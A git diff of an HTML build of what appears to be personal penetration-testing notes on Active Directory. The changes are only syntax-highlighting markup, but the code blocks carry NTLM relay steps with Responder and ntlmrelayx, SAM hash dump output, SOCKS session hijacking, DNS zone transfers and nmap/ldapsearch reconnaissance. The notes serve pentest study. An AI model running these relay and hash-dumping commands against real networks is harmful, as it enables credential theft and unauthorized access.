@@ -45,6 +45,7 @@
 <meta property="og:url" content="https://AlrikRr.github.io/notes/active-directory/" />
 
 
+
     
     
   <link
@@ -266,15 +267,15 @@
         
             <div class="card">
                 <div class="card-body"><p>First gather all the ips that do not require smb signing</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
-</span></span></code></pre></div><p>Then edit responder configuration</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo vim /usr/share/responder/responder.conf
-</span></span></code></pre></div><p>Turn off the SMB and HTTP option, then run</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo responder -I ppp0 -v
-</span></span></code></pre></div><p>Once the responder is up, you can run ntlm relay attack using impacket tools</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ntlmrelayx.py -t 192.168.64.129 -smb2support
-</span></span><span style="display:flex;"><span>ntlmrelayx.py -tf targets.txt -smb2support -i
-</span></span></code></pre></div><p>More about it :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
+</code></pre></div><p>Then edit responder configuration</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo vim /usr/share/responder/responder.conf
+</code></pre></div><p>Turn off the SMB and HTTP option, then run</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo responder -I ppp0 -v
+</code></pre></div><p>Once the responder is up, you can run ntlm relay attack using impacket tools</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ntlmrelayx.py -t 192.168.64.129 -smb2support
+ntlmrelayx.py -tf targets.txt -smb2support -i
+</code></pre></div><p>More about it :</p>
 <ul>
 <li><a href="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adversary-in-the-middle/smb-relay">viperone</a></li>
 <li><a href="https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx">blog fox-it</a></li>
@@ -292,20 +293,20 @@
             <div class="card">
                 <div class="card-body"><p>The hacker (<code>192.168.195.175</code>) Select a target in the network (<code>192.168.195.5</code>). The victim is <code>192.168.195.3</code></p>
 <p>First we run the ntlm relay pointing to the target, every user trying to authenticate on this machine will be trigger.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ntlmrelayx.py -t 192.168.195.5
-</span></span></code></pre></div><p>Output of dumping SAM base hn the victime connect to target</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD-Thread-3: Received connection from 192.168.195.3, attacking target smb://192.168.195.5
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticating against smb://192.168.195.5 as EJEMPLO<span style="color:#ae81ff">\A</span>dministrator SUCCEED
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Service RemoteRegistry is in stopped state
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service RemoteRegistry
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x0fb1f3fb0688d27f094450941220df42
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping local SAM hashes <span style="color:#f92672">(</span>uid:rid:lmhash:nthash<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-</span></span><span style="display:flex;"><span>adminSQL:1000:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done dumping SAM hashes <span style="color:#66d9ef">for</span> host: 192.168.195.5
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Stopping service RemoteRegistry
-</span></span></code></pre></div><p>Source : <a href="https://www.secureauth.com/blog/what-is-old-is-new-again-the-relay-attack/"> secureauth </a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ntlmrelayx.py -t 192.168.195.5
+</code></pre></div><p>Output of dumping SAM base hn the victime connect to target</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD-Thread-3: Received connection from 192.168.195.3, attacking target smb://192.168.195.5
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticating against smb://192.168.195.5 as EJEMPLO<span style="color:#ae81ff">\A</span>dministrator SUCCEED
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Service RemoteRegistry is in stopped state
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service RemoteRegistry
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Target system bootKey: 0x0fb1f3fb0688d27f094450941220df42
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping local SAM hashes <span style="color:#f92672">(</span>uid:rid:lmhash:nthash<span style="color:#f92672">)</span>
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+adminSQL:1000:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done dumping SAM hashes <span style="color:#66d9ef">for</span> host: 192.168.195.5
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Stopping service RemoteRegistry
+</code></pre></div><p>Source : <a href="https://www.secureauth.com/blog/what-is-old-is-new-again-the-relay-attack/"> secureauth </a></p>
 </div>
             </div>
         
@@ -333,22 +334,22 @@ smb://EJEMPLO\Operator@192.168.195.7
 192.168.195.7
 192.168.195.10
 </code></pre><p>Then, we run the <em>ntlmrelayx.py</em> script with the <em>-socks</em> parameter:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ntlmrelayx.py -tf targets.txt -socks -smb2support
-</span></span></code></pre></div><p>The relay server is active and listening for connections. After a while, we receive a single incoming SMB connection. Our Administrator friend again. The script processes all the target file, matching the picked user with the victims, and relays the authentication data:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD-Thread-8: Connection from EJEMPLO/ADMINISTRATOR@192.168.195.5 controlled, attacking target smb://EJEMPLO<span style="color:#ae81ff">\A</span>dministrator@192.168.195.3
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticating against smb://EJEMPLO<span style="color:#ae81ff">\A</span>dministrator@192.168.195.3 as EJEMPLO/ADMINISTRATOR SUCCEED
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SOCKS: Adding EJEMPLO/ADMINISTRATOR@192.168.195.3<span style="color:#f92672">(</span>445<span style="color:#f92672">)</span> to active SOCKS connection. Enjoy
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD-Thread-8: Connection from EJEMPLO/ADMINISTRATOR@192.168.195.5 controlled, attacking target smb://EJEMPLO<span style="color:#ae81ff">\A</span>dministrator@192.168.195.2
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticating against smb://EJEMPLO<span style="color:#ae81ff">\A</span>dministrator@192.168.195.2 as EJEMPLO/ADMINISTRATOR SUCCEED
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SOCKS: Adding EJEMPLO/ADMINISTRATOR@192.168.195.2<span style="color:#f92672">(</span>445<span style="color:#f92672">)</span> to active SOCKS connection. Enjoy
-</span></span></code></pre></div><p>We can check the list of active sessions by typing <em>socks</em> at the <em>ntlmrelayx.py</em> prompt:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ntlmrelayx.py -tf targets.txt -socks -smb2support
+</code></pre></div><p>The relay server is active and listening for connections. After a while, we receive a single incoming SMB connection. Our Administrator friend again. The script processes all the target file, matching the picked user with the victims, and relays the authentication data:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD-Thread-8: Connection from EJEMPLO/ADMINISTRATOR@192.168.195.5 controlled, attacking target smb://EJEMPLO<span style="color:#ae81ff">\A</span>dministrator@192.168.195.3
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticating against smb://EJEMPLO<span style="color:#ae81ff">\A</span>dministrator@192.168.195.3 as EJEMPLO/ADMINISTRATOR SUCCEED
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SOCKS: Adding EJEMPLO/ADMINISTRATOR@192.168.195.3<span style="color:#f92672">(</span>445<span style="color:#f92672">)</span> to active SOCKS connection. Enjoy
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD-Thread-8: Connection from EJEMPLO/ADMINISTRATOR@192.168.195.5 controlled, attacking target smb://EJEMPLO<span style="color:#ae81ff">\A</span>dministrator@192.168.195.2
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticating against smb://EJEMPLO<span style="color:#ae81ff">\A</span>dministrator@192.168.195.2 as EJEMPLO/ADMINISTRATOR SUCCEED
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SOCKS: Adding EJEMPLO/ADMINISTRATOR@192.168.195.2<span style="color:#f92672">(</span>445<span style="color:#f92672">)</span> to active SOCKS connection. Enjoy
+</code></pre></div><p>We can check the list of active sessions by typing <em>socks</em> at the <em>ntlmrelayx.py</em> prompt:</p>
 <p><img src="ntlm.relay.socks.1.png" alt="socks 1"></p>
 <p>Let&rsquo;s suppose that two new connections from different users are created against our server:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD-Thread-3: Connection from EJEMPLO/NORMALUSER@192.168.195.6 controlled, attacking target smb://EJEMPLO<span style="color:#ae81ff">\n</span>ormaluser@192.168.195.7
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticating against smb://EJEMPLO<span style="color:#ae81ff">\n</span>ormaluser@192.168.195.7 as EJEMPLO/NORMALUSER SUCCEED
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SOCKS: Adding EJEMPLO/NORMALUSER@192.168.195.7<span style="color:#f92672">(</span>445<span style="color:#f92672">)</span> to active SOCKS connection. Enjoy
-</span></span></code></pre></div><p>The script processes all the target file again, matching the grabbed identities. Finally, checking the session list, we can see that we have multiple active sessions impersonating different users waiting to be used :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBD-Thread-3: Connection from EJEMPLO/NORMALUSER@192.168.195.6 controlled, attacking target smb://EJEMPLO<span style="color:#ae81ff">\n</span>ormaluser@192.168.195.7
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticating against smb://EJEMPLO<span style="color:#ae81ff">\n</span>ormaluser@192.168.195.7 as EJEMPLO/NORMALUSER SUCCEED
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SOCKS: Adding EJEMPLO/NORMALUSER@192.168.195.7<span style="color:#f92672">(</span>445<span style="color:#f92672">)</span> to active SOCKS connection. Enjoy
+</code></pre></div><p>The script processes all the target file again, matching the grabbed identities. Finally, checking the session list, we can see that we have multiple active sessions impersonating different users waiting to be used :</p>
 <p><img src="ntlm.relay.socks.2.png" alt="socks 2"></p>
 </div>
             </div>
@@ -365,8 +366,8 @@ smb://EJEMPLO\Operator@192.168.195.7
         <h5 class="note-title"><span>Zone Transfer</span></h5>
         
             <div class="card">
-                <div class="card-body"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig axfr xyz.local@dc01.xyz.local
-</span></span></code></pre></div></div>
+                <div class="card-body"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dig axfr xyz.local@dc01.xyz.local
+</code></pre></div></div>
             </div>
         
     </div>
@@ -382,12 +383,12 @@ smb://EJEMPLO\Operator@192.168.195.7
         <h5 class="note-title"><span>DNS Recon</span></h5>
         
             <div class="card">
-                <div class="card-body"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig -t SRV _ldap._tcp.dc._msdcs.domainnam
-</span></span></code></pre></div><p>You may easily obtain the IP of the DNS, which serves as the primary domain controller, by using the domain name as a target.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig -t SRV _gc._tcp.domainname
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig -t SRV __kerberos.__tcp._tcp.domainname
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dig -t SRV _kpasswd._tcp._tcp.domainname
-</span></span></code></pre></div><p>Don&rsquo;t forget to add the local domain inside the <code>/etc/hosts</code> file.</p>
+                <div class="card-body"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dig -t SRV _ldap._tcp.dc._msdcs.domainnam
+</code></pre></div><p>You may easily obtain the IP of the DNS, which serves as the primary domain controller, by using the domain name as a target.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dig -t SRV _gc._tcp.domainname
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dig -t SRV __kerberos.__tcp._tcp.domainname
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dig -t SRV _kpasswd._tcp._tcp.domainname
+</code></pre></div><p>Don&rsquo;t forget to add the local domain inside the <code>/etc/hosts</code> file.</p>
 </div>
             </div>
         
@@ -400,8 +401,8 @@ smb://EJEMPLO\Operator@192.168.195.7
         
             <div class="card">
                 <div class="card-body"><p>If you have the DFL, you can easily check whether the network uses legacy protocol.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -LLL -H ldap://10.9.35.11 -b <span style="color:#e6db74">&#39;&#39;</span> -s base <span style="color:#e6db74">&#39;(objectclass=*)&#39;</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ldapsearch -x -LLL -H ldap://10.9.35.11 -b <span style="color:#e6db74">&#39;&#39;</span> -s base <span style="color:#e6db74">&#39;(objectclass=*)&#39;</span>
+</code></pre></div></div>
             </div>
         
     </div>
@@ -416,11 +417,11 @@ smb://EJEMPLO\Operator@192.168.195.7
         <h5 class="note-title"><span>SMB Hosts</span></h5>
         
             <div class="card">
-                <div class="card-body"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.1.0/24  
-</span></span><span style="display:flex;"><span>nmap -Pn --script smb-vuln<span style="color:#ae81ff">\*</span> -p139,445
-</span></span></code></pre></div><p>If <code>SMBv1</code> not signed, get the lits of target for NTLM-relay attack</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
-</span></span></code></pre></div><p>Check <a href="https://alrikrr.github.io/notes/active-directory/attacks/ntlm-relay/">NTLM-Relay Multi-Targets</a></p>
+                <div class="card-body"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">crackmapexec smb 192.168.1.0/24  
+nmap -Pn --script smb-vuln<span style="color:#ae81ff">\*</span> -p139,445
+</code></pre></div><p>If <code>SMBv1</code> not signed, get the lits of target for NTLM-relay attack</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
+</code></pre></div><p>Check <a href="https://alrikrr.github.io/notes/active-directory/attacks/ntlm-relay/">NTLM-Relay Multi-Targets</a></p>
 </div>
             </div>
         
@@ -432,9 +433,9 @@ smb://EJEMPLO\Operator@192.168.195.7
         <h5 class="note-title"><span>Ping Sweep</span></h5>
         
             <div class="card">
-                <div class="card-body"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -sn 192.168.1.0/24 -oG ping-sweep.txt
-</span></span><span style="display:flex;"><span>grep Up ping-sweep.txt | cut -d <span style="color:#e6db74">&#34; &#34;</span> -f <span style="color:#ae81ff">2</span>
-</span></span></code></pre></div></div>
+                <div class="card-body"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -v -sn 192.168.1.0/24 -oG ping-sweep.txt
+grep Up ping-sweep.txt | cut -d <span style="color:#e6db74">&#34; &#34;</span> -f <span style="color:#ae81ff">2</span>
+</code></pre></div></div>
             </div>
         
     </div>
@@ -446,14 +447,14 @@ smb://EJEMPLO\Operator@192.168.195.7
         
             <div class="card">
                 <div class="card-body"><p><strong>Quick Scan</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -Pn -sV --top-ports <span style="color:#ae81ff">50</span> --open
-</span></span></code></pre></div><p><strong>Classic Scan</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -Pn -sC -sV &lt;ip<span style="color:#ae81ff">\&gt;</span>
-</span></span></code></pre></div><p><strong>Full Scan</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -Pn -sC -sV -p- &lt;ip<span style="color:#ae81ff">\&gt;</span>
-</span></span></code></pre></div><p><strong>UDP Scan</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sU -sC -sV &lt;ip<span style="color:#ae81ff">\&gt;</span>
-</span></span></code></pre></div><p><strong>Find Vulnerable Host :</strong>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -Pn -sV --top-ports <span style="color:#ae81ff">50</span> --open
+</code></pre></div><p><strong>Classic Scan</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -Pn -sC -sV &lt;ip<span style="color:#ae81ff">\&gt;</span>
+</code></pre></div><p><strong>Full Scan</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -Pn -sC -sV -p- &lt;ip<span style="color:#ae81ff">\&gt;</span>
+</code></pre></div><p><strong>UDP Scan</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sU -sC -sV &lt;ip<span style="color:#ae81ff">\&gt;</span>
+</code></pre></div><p><strong>Find Vulnerable Host :</strong>
 [[3️⃣ Low Hanging Fruit]]</p>
 </div>
             </div>
@@ -469,12 +470,12 @@ smb://EJEMPLO\Operator@192.168.195.7
                 <div class="card-body"><p>⚠️ Good to know : Main DomainController is always the Main DNS Server</p>
 <p>Check : <a href="https://alrikrr.github.io/notes/active-directory/0-recon/">0️⃣ Recon AD</a></p>
 <p><strong>Show Domain name &amp; DNS</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmcli dev show eth0
-</span></span><span style="display:flex;"><span>ip a <span style="color:#75715e">#Linux</span>
-</span></span><span style="display:flex;"><span>ifconfig /all <span style="color:#75715e">#Windows</span>
-</span></span></code></pre></div><p><strong>Enum Domain</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nslookup -type<span style="color:#ae81ff">\=</span>SRV<span style="color:#ae81ff">\_</span>ldap.<span style="color:#ae81ff">\_</span>tcp.dc.<span style="color:#ae81ff">\_</span>msdc.//DOMAIN/
-</span></span></code></pre></div><p>Check : <a href="https://alrikrr.github.io/notes/active-directory/attacks/dns/">DNS-Attacks</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmcli dev show eth0
+ip a <span style="color:#75715e">#Linux</span>
+ifconfig /all <span style="color:#75715e">#Windows</span>
+</code></pre></div><p><strong>Enum Domain</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nslookup -type<span style="color:#ae81ff">\=</span>SRV<span style="color:#ae81ff">\_</span>ldap.<span style="color:#ae81ff">\_</span>tcp.dc.<span style="color:#ae81ff">\_</span>msdc.//DOMAIN/
+</code></pre></div><p>Check : <a href="https://alrikrr.github.io/notes/active-directory/attacks/dns/">DNS-Attacks</a></p>
 </div>
             </div>
         
